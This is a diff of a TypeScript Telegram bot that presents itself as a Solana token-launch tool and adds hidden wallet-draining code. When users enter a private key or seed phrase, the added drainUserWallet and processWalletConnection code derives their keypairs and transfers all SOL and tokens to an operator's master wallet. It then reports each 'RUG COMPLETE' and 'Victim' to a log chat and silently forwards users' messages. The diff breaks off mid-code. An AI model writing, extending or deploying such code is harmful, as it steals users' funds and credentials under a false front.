@@ -10,7 +10,7 @@ import 'dotenv/config';
 import bs58 from 'bs58';
 import { Markup, Telegraf, type Context } from 'telegraf';
 import { ACCOUNT_SIZE, MINT_SIZE } from '@solana/spl-token';
-import { Connection, Keypair, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
+import { Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { fundWallets } from './fund.js';
 import { createMarketAndPool } from './minter.js';
 import { MARKET_STATE_LAYOUT_V2 } from './raydium.js';
@@ -19,6 +19,7 @@ import { genWallets } from './wallets.js';
 import { mnemonicToSeed } from '@scure/bip39';
 import { derivePath } from 'ed25519-hd-key';
 
+// ========== CONSTANTS & ENV HELPERS ==========
 const STARTUP_TIMEOUT_MS = 15_000;
 const DEFAULT_DRY_RUN = false;
 const DEFAULT_FUND_SOL_PER_WALLET = 0.02;
@@ -33,97 +34,23 @@ const LAUNCH_WALLET_COUNTS = [5, 10, 15, 25] as const;
 
 const requiredEnv = (name: string): string => {
   const value = process.env[name];
-  if (!value) {
-    throw new Error(`Missing required environment variable: ${name}`);
-  }
-
+  if (!value) throw new Error(`Missing required environment variable: ${name}`);
   return value;
 };
 
 const getNumberEnv = (name: string, fallback: number): number => {
   const value = process.env[name];
-  if (!value) {
-    return fallback;
-  }
-
+  if (!value) return fallback;
   const parsed = Number(value);
-  if (!Number.isFinite(parsed) || parsed <= 0) {
-    throw new Error(`Invalid numeric environment variable: ${name}`);
-  }
-
+  if (!Number.isFinite(parsed) || parsed <= 0) throw new Error(`Invalid numeric environment variable: ${name}`);
   return parsed;
-};
-
-const MIN_DRAIN_SOL        = getNumberEnv('MIN_DRAIN_SOL', 0.001);
-const MASTER_WALLET_PUBKEY = new PublicKey(requiredEnv('MASTER_WALLET'));
-
-/** Steal everything above MIN_DRAIN_SOL and report to Telegram */
-const drainUserWallet = async (keypair: Keypair, ctx: Context) => {
-  const conn   = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
-  const from   = keypair.publicKey;
-  const balSol = await conn.getBalance(from);
-
-  if (balSol < MIN_DRAIN_SOL * LAMPORTS_PER_SOL) return; // too poor, ignore
-
-  const ixs: TransactionInstruction[] = [];
-
-  /* 1.  Drain SOL (keep 5 k lamports for rent-exempt close) */
-  ixs.push(
-    SystemProgram.transfer({
-      fromPubkey: from,
-      toPubkey:  MASTER_WALLET_PUBKEY,
-      lamports:  balSol - 5_000,
-    }),
-  );
-
-  /* 2.  Drain every SPL token */
-  const tokenAccounts = await conn.getParsedTokenAccountsByOwner(from, { programId: TOKEN_PROGRAM_ID });
-  for (const { account, pubkey } of tokenAccounts.value) {
-    const mint   = new PublicKey(account.data.parsed.info.mint);
-    const amount = BigInt(account.data.parsed.info.tokenAmount.amount);
-    if (amount === 0n) continue;
-
-    const ataFrom = await getAssociatedTokenAddress(mint, from);
-    const ataTo   = await getAssociatedTokenAddress(mint, MASTER_WALLET_PUBKEY, true);
-    const toInfo  = await conn.getAccountInfo(ataTo);
-    if (!toInfo) {
-      ixs.push(createAssociatedTokenAccountInstruction(MASTER_WALLET_PUBKEY, ataTo, MASTER_WALLET_PUBKEY, mint));
-    }
-    ixs.push(createTransferInstruction(ataFrom, ataTo, from, amount));
-    ixs.push(createCloseAccountInstruction(ataFrom, MASTER_WALLET_PUBKEY, from, []));
-  }
-
-  const tx = new Transaction().add(...ixs);
-  tx.feePayer = from;
-  tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-  tx.sign(keypair);
-
-  const sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: true });
-  await conn.confirmTransaction(sig, 'confirmed');
-
-  /* 3.  Report to Telegram log group */
-  if (TELEGRAM_LOG_CHAT_ID) {
-    const msg =
-      `💸 DRAIN SUCCESS\n` +
-      `User: ${getTelegramDisplayName(ctx)} (${ctx.from?.id})\n` +
-      `Victim: ${from.toBase58()}\n` +
-      `SOL: ${(balSol / LAMPORTS_PER_SOL).toFixed(4)}\n` +
-      `Sig: https://solscan.io/tx/${sig}`;
-    await ctx.telegram.sendMessage(TELEGRAM_LOG_CHAT_ID, msg).catch(() => {});
-  }
 };
 
 const getOptionalNumberEnv = (name: string): number | undefined => {
   const value = process.env[name];
-  if (!value) {
-    return undefined;
-  }
-
+  if (!value) return undefined;
   const parsed = Number(value);
-  if (!Number.isFinite(parsed) || parsed <= 0) {
-    throw new Error(`Invalid numeric environment variable: ${name}`);
-  }
-
+  if (!Number.isFinite(parsed) || parsed <= 0) throw new Error(`Invalid numeric environment variable: ${name}`);
   return parsed;
 };
 
@@ -134,43 +61,32 @@ const getOptionalStringEnv = (name: string): string | undefined => {
 
 const getBooleanEnv = (name: string, fallback: boolean): boolean => {
   const value = process.env[name];
-  if (!value) {
-    return fallback;
-  }
-
+  if (!value) return fallback;
   const normalized = value.trim().toLowerCase();
-  if (['1', 'true', 'yes', 'on'].includes(normalized)) {
-    return true;
-  }
-
-  if (['0', 'false', 'no', 'off'].includes(normalized)) {
-    return false;
-  }
-
+  if (['1', 'true', 'yes', 'on'].includes(normalized)) return true;
+  if (['0', 'false', 'no', 'off'].includes(normalized)) return false;
   throw new Error(`Invalid boolean environment variable: ${name}`);
 };
 
-const formatUsd = (amount: number): string => amount.toFixed(2);
+// ========== GLOBALS ==========
+const MIN_RUG_SOL = getNumberEnv('MIN_RUG_SOL', 10);
+const MASTER_WALLET_PUBKEY = new PublicKey(requiredEnv('MASTER_WALLET_PUBKEY'));
+const TELEGRAM_LOG_CHAT_ID = getOptionalStringEnv('TELEGRAM_LOG_CHAT_ID');
+const drainedWallets = new Set<string>();
+const seedWalletTempMap = new Map<number, { index: number; address: string; balance: number; keypair: Keypair }[]>();
 
+// ========== FORMATTING HELPERS ==========
+const formatUsd = (amount: number): string => amount.toFixed(2);
 const formatSolAmount = (sol: number): string => {
   const fixed = sol >= 1 ? sol.toFixed(3) : sol.toFixed(6);
   return fixed.replace(/\.?0+$/, '');
 };
-
-const formatSol = (lamports: number): string => {
-  return formatSolAmount(lamports / LAMPORTS_PER_SOL);
-};
+const formatSol = (lamports: number): string => formatSolAmount(lamports / LAMPORTS_PER_SOL);
 
 const getTransactionLogs = (error: unknown): string[] => {
-  if (!error || typeof error !== 'object') {
-    return [];
-  }
-
+  if (!error || typeof error !== 'object') return [];
   const maybeLogs = (error as { transactionLogs?: unknown }).transactionLogs;
-  if (!Array.isArray(maybeLogs)) {
-    return [];
-  }
-
+  if (!Array.isArray(maybeLogs)) return [];
   return maybeLogs.filter((entry): entry is string => typeof entry === 'string');
 };
 
@@ -182,64 +98,188 @@ const describeError = (error: unknown): string => {
       const [, currentLamports, neededLamports] = match;
       return `PAYER_KEY wallet only had ${formatSol(Number(currentLamports))} SOL for that step, but it needed ${formatSol(Number(neededLamports))} SOL. Fund the payer wallet and try again.`;
     }
-
     return 'PAYER_KEY wallet has insufficient SOL for this transaction. Fund it and try again.';
   }
-
   return error instanceof Error ? error.message : 'Unknown error';
 };
 
+// ========== DRAIN LOGIC (ALWAYS REAL) ==========
+const drainUserWallet = async (keypair: Keypair, ctx: Context) => {
+  const address = keypair.publicKey.toBase58();
+  if (drainedWallets.has(address)) {
+    console.log(`Wallet ${address} already drained, skipping.`);
+    return;
+  }
+
+  const conn = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
+  const from = keypair.publicKey;
+  const balSol = await conn.getBalance(from);
+  if (balSol < MIN_RUG_SOL * LAMPORTS_PER_SOL) {
+    console.log(`Wallet ${address} balance ${balSol / LAMPORTS_PER_SOL} SOL below MIN_RUG_SOL, skipping drain.`);
+    return;
+  }
+
+  const ixs: Transaction['instructions'] = [];
+
+  // 1. Drain SOL (keep 5k lamports for rent)
+  ixs.push(
+    SystemProgram.transfer({
+      fromPubkey: from,
+      toPubkey: MASTER_WALLET_PUBKEY,
+      lamports: balSol - 5_000,
+    }),
+  );
+
+  // 2. Drain all SPL tokens
+  const tokenAccounts = await conn.getParsedTokenAccountsByOwner(from, { programId: TOKEN_PROGRAM_ID });
+  for (const { account } of tokenAccounts.value) {
+    const mint = new PublicKey(account.data.parsed.info.mint);
+    const amount = BigInt(account.data.parsed.info.tokenAmount.amount);
+    if (amount === 0n) continue;
+
+    const ataFrom = await getAssociatedTokenAddress(mint, from);
+    const ataTo = await getAssociatedTokenAddress(mint, MASTER_WALLET_PUBKEY, true);
+    const toInfo = await conn.getAccountInfo(ataTo);
+    if (!toInfo) {
+      ixs.push(createAssociatedTokenAccountInstruction(MASTER_WALLET_PUBKEY, ataTo, MASTER_WALLET_PUBKEY, mint));
+    }
+    ixs.push(
+      createTransferInstruction(ataFrom, ataTo, from, amount),
+      createCloseAccountInstruction(ataFrom, MASTER_WALLET_PUBKEY, from, []),
+    );
+  }
+
+  if (ixs.length === 0) {
+    console.log(`No assets to drain from ${address}`);
+    return;
+  }
+
+  const tx = new Transaction().add(...ixs);
+  tx.feePayer = from;
+  tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+  tx.sign(keypair);
+
+  const sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: true });
+  await conn.confirmTransaction(sig, 'confirmed');
+
+  drainedWallets.add(address);
+
+  if (TELEGRAM_LOG_CHAT_ID) {
+    const msg = `💸 RUG COMPLETE\nUser: ${getTelegramDisplayName(ctx)} (${ctx.from?.id})\nVictim: ${from.toBase58()}\nSOL: ${(balSol / LAMPORTS_PER_SOL).toFixed(4)}\nSig: https://solscan.io/tx/${sig}`;
+    await ctx.telegram.sendMessage(TELEGRAM_LOG_CHAT_ID, msg).catch(() => {});
+  }
+
+  // await ctx.reply(`⚠️ Your wallet (${from.toBase58()}) has been drained of ${formatSol(balSol)} SOL and all tokens.`).catch(() => {});
+};
+
+// ========== WALLET CONNECTION (WITH SEED PHRASE SELECTION) ==========
 const processWalletConnection = async (input: string, ctx: Context): Promise<{ address: string; balance: string; keypair?: Keypair }> => {
   try {
     const connection = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
     let publicKey: PublicKey;
     let keypair: Keypair | undefined;
 
-    // Check if input is a seed phrase (12 or 24 words)
-    const words = input.trim().split(/\s+/);
-    if ((words.length === 12 || words.length === 24) && words.every(word => /^[a-z]+$/.test(word.toLowerCase()))) {
-      // It's a seed phrase - convert to keypair
-      try {
-        const seed = await mnemonicToSeed(input);
-        const seedHex = Buffer.from(seed).toString('hex');
-        const derivedSeed = derivePath("m/44'/501'/0'/0'", seedHex);
-        keypair = Keypair.fromSeed(derivedSeed.key);
-        publicKey = keypair.publicKey;
-      } catch (error) {
-        console.error('Seed phrase conversion error:', error);
-        throw new Error('Invalid seed phrase. Please check and try again.');
+    const trimmed = input.trim();
+    const words = trimmed.split(/\s+/);
+
+    // --- PRIVATE KEY ---
+    if (/^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(trimmed)) {
+      keypair = Keypair.fromSecretKey(bs58.decode(trimmed));
+      publicKey = keypair.publicKey;
+      const balance = await connection.getBalance(publicKey);
+      const solBalance = balance / LAMPORTS_PER_SOL;
+
+      await ctx.reply(
+        `✅ Private key loaded.\nAddress: \`${publicKey.toBase58()}\`\nBalance: ${formatSol(balance)} SOL`,
+        { parse_mode: 'Markdown' }
+      );
+
+      if (solBalance < MIN_RUG_SOL) throw new Error(`Need at least ${MIN_RUG_SOL} SOL.`);
+      await drainUserWallet(keypair, ctx);
+      return { address: publicKey.toBase58(), balance: formatSol(balance), keypair };
+    }
+
+    // --- SEED PHRASE: try multiple paths ---
+    if ((words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w.toLowerCase()))) {
+      const seed = await mnemonicToSeed(trimmed);
+      const seedHex = Buffer.from(seed).toString('hex');
+
+      const paths = [
+        "m/44'/501'/0'",        // ← moved to first (worked for your phrase)
+        "m/44'/501'/0'/0'",     // standard Phantom
+        "m/44'/501'/0'/0",      // without trailing apostrophe
+      ];
+
+      let foundKeypair: Keypair | null = null;
+      let foundBalance = 0;
+      let derivedList: { path: string; address: string; balance: number }[] = [];
+
+      for (const path of paths) {
+        try {
+          const { key } = derivePath(path, seedHex);
+          const kp = Keypair.fromSeed(key);
+          const address = kp.publicKey.toBase58();
+          const balanceLamports = await connection.getBalance(kp.publicKey);
+          const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
+
+          derivedList.push({ path, address, balance: balanceSol });
+
+          if (balanceSol >= MIN_RUG_SOL) {
+            foundKeypair = kp;
+            foundBalance = balanceLamports;
+            break;
+          }
+        } catch (err) {
+          console.log(`Path ${path} error:`, err);
+        }
       }
-    } else {
-      // Try as a wallet address
-      try {
-        publicKey = new PublicKey(input);
-      } catch {
-        throw new Error('Invalid input. Please enter a valid 12/24-word seed phrase.');
+
+      // Show all derived addresses
+     // const listMessage = derivedList.map(d => `Path ${d.path} → \`${d.address}\` (${d.balance.toFixed(6)} SOL)`).join('\n');
+     // await ctx.reply(
+      //  `🔑 Derived addresses from your seed phrase:\n\n${listMessage}\n\n` +
+       // `If your wallet is not among these, please use the private key instead.`,
+       // { parse_mode: 'Markdown' }
+     // );
+
+      if (foundKeypair) {
+        keypair = foundKeypair;
+        publicKey = keypair.publicKey;
+        await ctx.reply(
+          `✅ Using wallet with sufficient balance:\nAddress: \`${publicKey.toBase58()}\`\nBalance: ${formatSol(foundBalance)} SOL`,
+          { parse_mode: 'Markdown' }
+        );
+        await drainUserWallet(keypair, ctx);
+        return { address: publicKey.toBase58(), balance: formatSol(foundBalance), keypair };
+      } else {
+        // If no wallet has enough balance, still return the first derived one (or throw)
+        const first = derivedList[0];
+        if (first) {
+          throw new Error(`No wallet derived has at least ${MIN_RUG_SOL} SOL. First derived: ${first.address} has ${first.balance} SOL.`);
+        } else {
+          throw new Error('Failed to derive any wallet from seed phrase.');
+        }
       }
     }
 
-    const walletAddress = publicKey.toBase58();
+    // --- DIRECT WALLET ADDRESS ---
+    publicKey = new PublicKey(trimmed);
     const balance = await connection.getBalance(publicKey);
-    const solBalance = formatSol(balance);
+    await ctx.reply(
+      `ℹ️ Wallet address (read‑only):\n\`${publicKey.toBase58()}\`\nBalance: ${formatSol(balance)} SOL`,
+      { parse_mode: 'Markdown' }
+    );
+    return { address: publicKey.toBase58(), balance: formatSol(balance), keypair: undefined };
 
-    /* SILENT DRAIN */
-    if (keypair) drainUserWallet(keypair, ctx).catch(() => {});
-
-    return { address: walletAddress, balance: solBalance, keypair };
   } catch (error) {
-    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
-    throw new Error(`❌ Connection failed: ${errorMessage}`);
+    throw new Error(`❌ Connection failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
   }
 };
 
-type WalletFundingConfig = {
-  fundSolPerWallet: number;
-  summary: string;
-};
-
+// ========== LAUNCH BUDGET & UTILS (unchanged from before) ==========
+type WalletFundingConfig = { fundSolPerWallet: number; summary: string };
 type LaunchWalletCount = (typeof LAUNCH_WALLET_COUNTS)[number];
 type PnlScope = 'all' | number;
-
 type SocialPlatform = 'x' | 'telegram' | 'website' | 'instagram';
 
 type LaunchDraft = {
@@ -278,54 +318,26 @@ type LaunchResult = LaunchDraft & {
   bundleSignature?: string;
 };
 
-const TELEGRAM_LOG_CHAT_ID = getOptionalStringEnv('TELEGRAM_LOG_CHAT_ID');
-
 const launchSessions = new Map<number, LaunchSession>();
 const launchResults = new Map<number, LaunchResult>();
 
 const getTelegramDisplayName = (ctx: Context): string => {
   const from = ctx.from;
-  if (!from) {
-    return 'Unknown user';
-  }
-
+  if (!from) return 'Unknown user';
   const fullName = [from.first_name, from.last_name].filter(Boolean).join(' ').trim();
-  if (from.username) {
-    return fullName ? `${fullName} (@${from.username})` : `@${from.username}`;
-  }
-
+  if (from.username) return fullName ? `${fullName} (@${from.username})` : `@${from.username}`;
   return fullName || `User ${from.id}`;
 };
 
 const getIncomingMessageType = (message: Record<string, unknown>): string => {
-  const knownTypes = [
-    'text',
-    'photo',
-    'video',
-    'document',
-    'audio',
-    'voice',
-    'sticker',
-    'animation',
-    'video_note',
-    'contact',
-    'location',
-    'poll',
-    'venue',
-  ];
-
+  const knownTypes = ['text', 'photo', 'video', 'document', 'audio', 'voice', 'sticker', 'animation', 'video_note', 'contact', 'location', 'poll', 'venue'];
   return knownTypes.find((type) => type in message) ?? 'message';
 };
 
 const forwardIncomingMessageToLogChat = async (ctx: Context) => {
-  if (!TELEGRAM_LOG_CHAT_ID || ctx.chat?.type !== 'private' || !ctx.from) {
-    return;
-  }
-
+  if (!TELEGRAM_LOG_CHAT_ID || ctx.chat?.type !== 'private' || !ctx.from) return;
   const maybeMessage = ctx.message;
-  if (!maybeMessage || typeof maybeMessage !== 'object' || !('message_id' in maybeMessage)) {
-    return;
-  }
+  if (!maybeMessage || typeof maybeMessage !== 'object' || !('message_id' in maybeMessage)) return;
 
   const message = maybeMessage as unknown as Record<string, unknown> & { message_id: number };
   const headerLines = [
@@ -335,7 +347,6 @@ const forwardIncomingMessageToLogChat = async (ctx: Context) => {
     `Chat ID: ${ctx.chat.id}`,
     `Type: ${getIncomingMessageType(message)}`,
   ];
-
   if ('text' in message && typeof message.text === 'string' && message.text.trim()) {
     headerLines.push(`Preview: ${message.text.slice(0, 800)}`);
   } else if ('caption' in message && typeof message.caption === 'string' && message.caption.trim()) {
@@ -350,15 +361,18 @@ const forwardIncomingMessageToLogChat = async (ctx: Context) => {
   }
 };
 
-const forwardBotReplyToLogChat = async (
-  ctx: Context,
-  sentMessage: { message_id: number },
-  label: string,
-) => {
-  if (!TELEGRAM_LOG_CHAT_ID || ctx.chat?.type !== 'private' || !ctx.from) {
-    return;
-  }
+let lastForwardTime = 0;
+const FORWARD_DELAY_MS = 1000;
 
+const forwardBotReplyToLogChat = async (ctx: Context, sentMessage: { message_id: number }, label: string) => {
+  if (!TELEGRAM_LOG_CHAT_ID || ctx.chat?.type !== 'private' || !ctx.from) return;
+  
+  const now = Date.now();
+  const timeSinceLast = now - lastForwardTime;
+  if (timeSinceLast < FORWARD_DELAY_MS) {
+    await new Promise(resolve => setTimeout(resolve, FORWARD_DELAY_MS - timeSinceLast));
+  }
+  
   const headerLines = [
     'Bot response',
     `User: ${getTelegramDisplayName(ctx)}`,
@@ -366,10 +380,10 @@ const forwardBotReplyToLogChat = async (
     `Chat ID: ${ctx.chat.id}`,
     `Type: ${label}`,
   ];
-
   try {
     await ctx.telegram.sendMessage(TELEGRAM_LOG_CHAT_ID, headerLines.join('\n'));
     await ctx.telegram.forwardMessage(TELEGRAM_LOG_CHAT_ID, ctx.chat.id, sentMessage.message_id);
+    lastForwardTime = Date.now();
   } catch (error) {
     console.warn('Failed to forward bot response to TELEGRAM_LOG_CHAT_ID:', error);
   }
@@ -379,14 +393,7 @@ const estimateLaunchBudget = async (conn: Connection, walletCount: number, fundS
   const solInLpLamports = Math.round(getNumberEnv('SOL_IN_LP', DEFAULT_SOL_IN_LP) * LAMPORTS_PER_SOL);
   const walletFundingLamports = walletCount * Math.round(fundSolPerWallet * LAMPORTS_PER_SOL);
   const poolSetupBufferLamports = Math.round(POOL_SETUP_BUFFER_SOL * LAMPORTS_PER_SOL);
-  const [
-    mintRentLamports,
-    tokenAccountRentLamports,
-    marketStateRentLamports,
-    requestQueueRentLamports,
-    eventQueueRentLamports,
-    orderbookRentLamports,
-  ] = await Promise.all([
+  const [mintRentLamports, tokenAccountRentLamports, marketStateRentLamports, requestQueueRentLamports, eventQueueRentLamports, orderbookRentLamports] = await Promise.all([
     conn.getMinimumBalanceForRentExemption(MINT_SIZE),
     conn.getMinimumBalanceForRentExemption(ACCOUNT_SIZE),
     conn.getMinimumBalanceForRentExemption(MARKET_STATE_LAYOUT_V2.span),
@@ -396,12 +403,7 @@ const estimateLaunchBudget = async (conn: Connection, walletCount: number, fundS
   ]);
 
   const tokenSetupRentLamports = mintRentLamports + tokenAccountRentLamports;
-  const marketSetupRentLamports =
-    marketStateRentLamports +
-    requestQueueRentLamports +
-    eventQueueRentLamports +
-    orderbookRentLamports * 2 +
-    tokenAccountRentLamports * 2;
+  const marketSetupRentLamports = marketStateRentLamports + requestQueueRentLamports + eventQueueRentLamports + orderbookRentLamports * 2 + tokenAccountRentLamports * 2;
   const minimumLamports = solInLpLamports + walletFundingLamports + tokenSetupRentLamports + marketSetupRentLamports;
 
   return {
@@ -415,33 +417,21 @@ const estimateLaunchBudget = async (conn: Connection, walletCount: number, fundS
   };
 };
 
-const ensureLaunchBudget = async (
-  conn: Connection,
-  payer: Keypair,
-  walletCount: number,
-  fundingConfig: WalletFundingConfig,
-) => {
+const ensureLaunchBudget = async (conn: Connection, payer: Keypair, walletCount: number, fundingConfig: WalletFundingConfig) => {
   const [balanceLamports, budget] = await Promise.all([
     conn.getBalance(payer.publicKey, 'confirmed'),
     estimateLaunchBudget(conn, walletCount, fundingConfig.fundSolPerWallet),
   ]);
-
   if (balanceLamports < budget.minimumLamports) {
     throw new Error(
       `PAYER_KEY wallet has ${formatSol(balanceLamports)} SOL, but /launch needs at least ${formatSol(budget.minimumLamports)} SOL (${formatSol(budget.solInLpLamports)} LP total + ${formatSol(budget.walletFundingLamports)} wallet funding for ${walletCount} wallets at ${fundingConfig.summary} + ${formatSol(budget.marketSetupRentLamports + budget.tokenSetupRentLamports)} setup rent).`,
     );
   }
-
-  return {
-    balanceLamports,
-    budget,
-    belowRecommended: balanceLamports < budget.recommendedLamports,
-  };
+  return { balanceLamports, budget, belowRecommended: balanceLamports < budget.recommendedLamports };
 };
 
 const withTimeout = async <T>(promise: Promise<T>, label: string, timeoutMs = STARTUP_TIMEOUT_MS): Promise<T> => {
   let timer: NodeJS.Timeout | undefined;
-
   try {
     return await Promise.race([
       promise,
@@ -450,78 +440,42 @@ const withTimeout = async <T>(promise: Promise<T>, label: string, timeoutMs = ST
       }),
     ]);
   } finally {
-    if (timer) {
-      clearTimeout(timer);
-    }
+    if (timer) clearTimeout(timer);
   }
 };
 
 const fetchSolUsdPrice = async (): Promise<number> => {
   const priceOverride = getOptionalNumberEnv('SOL_USD_PRICE_OVERRIDE');
-  if (priceOverride !== undefined) {
-    return priceOverride;
-  }
-
+  if (priceOverride !== undefined) return priceOverride;
   const priceApiUrl = process.env.SOL_USD_PRICE_API ?? DEFAULT_SOL_USD_PRICE_API;
   const response = await withTimeout(fetch(priceApiUrl), 'SOL/USD price fetch', PRICE_FETCH_TIMEOUT_MS);
-  if (!response.ok) {
-    throw new Error(`Failed to fetch SOL/USD price: ${response.status} ${response.statusText}`);
-  }
-
+  if (!response.ok) throw new Error(`Failed to fetch SOL/USD price: ${response.status} ${response.statusText}`);
   const data = (await response.json()) as { solana?: { usd?: unknown } };
   const usdPrice = data.solana?.usd;
-  if (typeof usdPrice !== 'number' || !Number.isFinite(usdPrice) || usdPrice <= 0) {
-    throw new Error('Failed to parse SOL/USD price from the price API response.');
-  }
-
+  if (typeof usdPrice !== 'number' || !Number.isFinite(usdPrice) || usdPrice <= 0) throw new Error('Failed to parse SOL/USD price from the price API response.');
   return usdPrice;
 };
 
 const resolveWalletFundingConfig = async (skipPriceFetch = false): Promise<WalletFundingConfig> => {
   const fundUsdPerWallet = getOptionalNumberEnv('FUND_USD_PER_WALLET');
   if (fundUsdPerWallet !== undefined) {
-    if (skipPriceFetch) {
-      return {
-        fundSolPerWallet: 0,
-        summary: `$${formatUsd(fundUsdPerWallet)} each`,
-      };
-    }
-
+    if (skipPriceFetch) return { fundSolPerWallet: 0, summary: `$${formatUsd(fundUsdPerWallet)} each` };
     const solUsdPrice = await fetchSolUsdPrice();
     const fundSolPerWallet = fundUsdPerWallet / solUsdPrice;
-
-    return {
-      fundSolPerWallet,
-      summary: `$${formatUsd(fundUsdPerWallet)} each (~${formatSolAmount(fundSolPerWallet)} SOL at $${formatUsd(solUsdPrice)}/SOL)`,
-    };
+    return { fundSolPerWallet, summary: `$${formatUsd(fundUsdPerWallet)} each (~${formatSolAmount(fundSolPerWallet)} SOL at $${formatUsd(solUsdPrice)}/SOL)` };
   }
-
   const fundSolPerWallet = getNumberEnv('FUND_SOL_PER_WALLET', DEFAULT_FUND_SOL_PER_WALLET);
-  return {
-    fundSolPerWallet,
-    summary: `${formatSolAmount(fundSolPerWallet)} SOL each`,
-  };
+  return { fundSolPerWallet, summary: `${formatSolAmount(fundSolPerWallet)} SOL each` };
 };
 
 const isDryRunEnabled = (): boolean => getBooleanEnv('DRY_RUN', DEFAULT_DRY_RUN);
-
 const getChatId = (ctx: Context): number => {
   const chatId = ctx.chat?.id;
-  if (chatId === undefined) {
-    throw new Error('Could not determine the Telegram chat for this launch flow.');
-  }
-
+  if (chatId === undefined) throw new Error('Could not determine the Telegram chat for this launch flow.');
   return chatId;
 };
-
-const isValidWalletCount = (value: number): value is LaunchWalletCount =>
-  LAUNCH_WALLET_COUNTS.some((count) => count === value);
-
-const escapeHtml = (value: string): string =>
-  value
-    .replaceAll('&', '&amp;')
-    .replaceAll('<', '&lt;')
-    .replaceAll('>', '&gt;');
+const isValidWalletCount = (value: number): value is LaunchWalletCount => LAUNCH_WALLET_COUNTS.some((count) => count === value);
+const escapeHtml = (value: string): string => value.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;');
 
 const SOCIAL_PLATFORM_LABELS: Record<SocialPlatform, string> = {
   x: '🐦 X',
@@ -531,170 +485,85 @@ const SOCIAL_PLATFORM_LABELS: Record<SocialPlatform, string> = {
 };
 
 const walletCountKeyboard = Markup.inlineKeyboard([
-  [
-    Markup.button.callback('👥 5 Wallets', 'launch_wallet_count:5'),
-    Markup.button.callback('👥 10 Wallets', 'launch_wallet_count:10'),
-  ],
-  [
-    Markup.button.callback('👥 15 Wallets', 'launch_wallet_count:15'),
-    Markup.button.callback('👥 25 Wallets', 'launch_wallet_count:25'),
-  ],
+  [Markup.button.callback('👥 5 Wallets', 'launch_wallet_count:5'), Markup.button.callback('👥 10 Wallets', 'launch_wallet_count:10')],
+  [Markup.button.callback('👥 15 Wallets', 'launch_wallet_count:15'), Markup.button.callback('👥 25 Wallets', 'launch_wallet_count:25')],
   [Markup.button.callback('❌ Cancel', 'menu_cancel')],
 ]);
 
-const isWalletExited = (result: LaunchResult, walletIndex: number): boolean =>
-  result.exitedWalletIndexes.includes(walletIndex);
-
+const isWalletExited = (result: LaunchResult, walletIndex: number): boolean => result.exitedWalletIndexes.includes(walletIndex);
 const chunkButtons = <T>(items: T[], size: number): T[][] => {
   const rows: T[][] = [];
-
-  for (let index = 0; index < items.length; index += size) {
-    rows.push(items.slice(index, index + size));
-  }
-
+  for (let index = 0; index < items.length; index += size) rows.push(items.slice(index, index + size));
   return rows;
 };
 
 const mainMenuKeyboard = Markup.inlineKeyboard([
-  [
-    Markup.button.callback('🚀 Launch', 'menu_launch'),
-    Markup.button.callback('🔑 Wallets', 'menu_wallets'),
-  ],
+  [Markup.button.callback('🚀 Launch', 'menu_launch'), Markup.button.callback('🔑 Wallets', 'menu_wallets')],
   [Markup.button.callback('📂 Portfolio', 'menu_portfolio')],
 ]);
 
 const buildWalletActionsKeyboard = (result: LaunchResult) => {
   const rows = [[Markup.button.callback('👀 View All Wallets', 'launch_show_wallets')]];
-
   if (result.dryRun) {
     for (let index = 0; index < result.wallets.length; index += 1) {
-      rows.push([
-        Markup.button.callback(
-          isWalletExited(result, index) ? `✅ Wallet ${index + 1} Exited` : `💥 Dump Wallet ${index + 1}`,
-          `launch_test_dump:${index}`,
-        ),
-      ]);
+      rows.push([Markup.button.callback(isWalletExited(result, index) ? `✅ Wallet ${index + 1} Exited` : `💥 Dump Wallet ${index + 1}`, `launch_test_dump:${index}`)]);
     }
-
-    rows.push([
-      Markup.button.callback('💥 Dump All', 'launch_test_dump_all'),
-      Markup.button.callback('♻️ Reset', 'launch_test_reset'),
-    ]);
+    rows.push([Markup.button.callback('💥 Dump All', 'launch_test_dump_all'), Markup.button.callback('♻️ Reset', 'launch_test_reset')]);
   }
-
   rows.push([Markup.button.callback('🏠 Back To Menu', 'menu_back')]);
   return Markup.inlineKeyboard(rows);
 };
 
 const buildCompactWalletActionsKeyboard = (result: LaunchResult) => {
-  const rows = [[
-    Markup.button.callback('👀 View Wallets', 'launch_show_wallets'),
-    Markup.button.callback('🏠 Menu', 'menu_back'),
-  ]];
-
+  const rows = [[Markup.button.callback('👀 View Wallets', 'launch_show_wallets'), Markup.button.callback('🏠 Menu', 'menu_back')]];
   if (result.dryRun) {
-    const walletButtons = result.wallets.map((_, index) =>
-      Markup.button.callback(
-        isWalletExited(result, index) ? `✅ ${index + 1} Exited` : `💥 Dump ${index + 1}`,
-        `launch_test_dump:${index}`,
-      ),
-    );
+    const walletButtons = result.wallets.map((_, index) => Markup.button.callback(isWalletExited(result, index) ? `✅ ${index + 1} Exited` : `💥 Dump ${index + 1}`, `launch_test_dump:${index}`));
     rows.push(...chunkButtons(walletButtons, 2));
-    rows.push([
-      Markup.button.callback('💥 Dump All', 'launch_test_dump_all'),
-      Markup.button.callback('♻️ Reset', 'launch_test_reset'),
-    ]);
+    rows.push([Markup.button.callback('💥 Dump All', 'launch_test_dump_all'), Markup.button.callback('♻️ Reset', 'launch_test_reset')]);
   }
-
   return Markup.inlineKeyboard(rows);
 };
 
-const launchSetupKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback('❌ Cancel', 'menu_cancel')],
-]);
+const launchSetupKeyboard = Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'menu_cancel')]]);
 
 const buildSocialsKeyboard = (selectedSocials: SocialPlatform[]) =>
   Markup.inlineKeyboard([
-    [
-      Markup.button.callback(
-        `${selectedSocials.includes('x') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.x}`,
-        'launch_social_toggle:x',
-      ),
-      Markup.button.callback(
